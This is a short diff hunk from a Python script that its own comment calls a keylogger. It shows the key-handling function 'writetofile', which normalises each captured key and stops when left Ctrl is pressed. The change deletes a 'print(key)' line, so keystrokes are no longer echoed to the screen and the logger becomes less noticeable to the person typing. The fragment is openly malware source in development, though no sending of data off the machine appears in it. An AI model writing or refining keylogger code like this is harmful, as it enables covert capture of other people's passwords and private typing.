@@ -14,7 +14,7 @@ def writetofile(key):
     global running
     letter = str(key)
     letter = letter.replace("'", "")
-    print(key)
+    
     # Check if the left Ctrl key is pressed for termination
     if key == Key.ctrl_l:
         running = False  # Set the flag to terminate the keylogger
